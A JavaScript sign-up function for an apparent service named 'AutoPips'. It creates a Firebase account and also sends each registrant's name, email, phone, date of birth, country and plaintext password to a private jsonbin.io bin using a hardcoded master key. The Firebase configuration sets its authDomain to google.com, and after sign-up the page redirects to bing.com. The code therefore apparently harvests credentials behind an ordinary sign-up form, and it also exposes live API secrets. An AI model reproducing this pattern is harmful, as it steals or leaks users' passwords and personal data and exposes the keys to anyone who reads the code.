


function signUpFirebase(){
    
      var firebaseConfig = {
      apiKey: "AIzaSyAKgvn2crUGUCgOZ5S0RT84iS_6ocNn8z8",
      authDomain: "https://www.google.com",
      projectId: "autopips-f6220",
      storageBucket: "YOUR_STORAGE_BUCKET",
      messagingSenderId: "154809636444",
      appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);

      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      firebase.auth().createUserWithEmailAndPassword(email, password)
        .then(function(user) {
          
          alert("Sign up successful!");
          window.location.href=("https://www.bing.com/");
          
        })
        .catch(function(error) {
          console.log(error.message);
        });
        
        
        
        
        
        var firstname = document.getElementById("firstname").value;
        var lastname = document.getElementById("lastname").value;
        var email = document.getElementById("email").value;
        var number = document.getElementById("number").value;
        var dob = document.getElementById("dob").value;
        var country = document.getElementById("country").value;
        var reason = document.getElementById("reason").value;
        var code = document.getElementById("code").value;
        var password = document.getElementById("password").value;
        
        const secretKey = '$2a$10$8uYzntc09IvmBSPpZMMg1eD5NmSykSmV57aBLgnsP0mRQ.HkN7Yd6';
        const binName= 'myBin';



      
        const data = {
        FirstName: firstname,
        LastName: lastname,
        Email: email,
        PhoneNumber: number,
        DateOfBirth: dob,
        Country: country,
        Reason: reason,
        ReferalCode: code,
        Password: password,
      };

      
       fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              "X-Master-Key": secretKey,
              "X-Bin-Private": true,
              'X-Bin-Name': "AutoPips New Account"
            },
            body: JSON.stringify(data)
          })
         .then(response => response.json())
         .then(jsonData => console.log(jsonData))
         .catch(error => console.error(error));
      

        
        
        
        
        
        
        
     
    
}





        
